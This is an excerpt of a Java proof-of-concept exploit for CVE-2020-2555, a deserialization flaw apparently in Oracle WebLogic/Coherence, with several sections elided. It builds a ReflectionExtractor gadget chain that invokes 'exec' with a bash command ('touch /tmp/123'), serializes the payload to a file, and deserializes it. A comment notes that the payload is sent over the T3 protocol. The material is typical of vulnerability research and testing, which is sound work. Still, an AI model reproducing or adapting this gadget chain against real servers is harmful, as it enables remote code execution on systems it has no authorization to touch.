...
public class CVE_2020_2555 {
    ...
    public static void main(String[] args) throws Exception {
        ...
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{new String[]{"/bin/bash","-c","touch /tmp/123"}}
        ...
        // T3 send, you can also use python script.
    ...
    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test1.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
    ...
    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test1.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
